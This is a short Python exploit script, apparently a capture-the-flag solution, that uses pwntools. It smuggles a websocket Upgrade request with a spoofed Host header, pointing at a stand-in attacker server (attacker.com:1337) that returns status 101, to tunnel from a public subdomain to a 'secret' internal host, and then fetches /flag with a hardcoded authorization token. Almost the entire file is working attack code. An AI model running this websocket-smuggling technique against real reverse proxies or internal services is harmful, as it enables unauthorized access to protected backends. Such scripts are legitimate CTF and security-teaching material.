#!/usr/bin/env python3

import sys
import requests
import socket
import ssl
import pwn

# This has to respond with status code 101
# TODO: change this to your server
EXPLOIT_HOST = 'attacker.com:1337'


def connect_tls(host, port):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((host, port))
    ssock = context.wrap_socket(sock, server_hostname=host)
    return pwn.remote(host, port, sock=ssock)


def format_request(method, path, headers):
    req = f'{method} {path} HTTP/1.1\r\n'
    for key, value in headers.items():
        req += f'{key}: {value}\r\n'
    req += '\r\n'
    return req.encode('utf-8')


def exploit(host, port):
    public_host = f'public.{host}'
    secret_host = f'secret.{host}'

    print('[*]', 'Opening TLS connection to public host...')
    r = connect_tls(public_host, port)
    
    print('[*]', 'Opening WS tunnel to secret host...')
    r.send(format_request('GET', f'/_meta/api/check?hostname={EXPLOIT_HOST}', {
        'Host': secret_host,
        'Connection': 'Upgrade',
        'Upgrade': 'websocket',
    }))
    r.recvuntil('\r\n\r\n')
    
    print('[*]', 'Sending flag request to secret host...')
    r.send(format_request('GET', '/flag', {
        'Host': secret_host,
        'Authorization': 'supersecretauthtoken:)',
    }))
    r.recvuntil('\r\n\r\n')
    flag = r.recvuntil('}').decode('utf-8')
    print('[+]', 'Flag:', flag)


def main():
    if len(sys.argv) not in (2, 3):
        print(f'Usage: {sys.argv[0]} <host> [port]')
        exit(1)

    host = sys.argv[1]
    if len(sys.argv) == 3:
        port = int(sys.argv[2])
    else:
        port = 443

    exploit(host, port)


if __name__ == '__main__':
    main()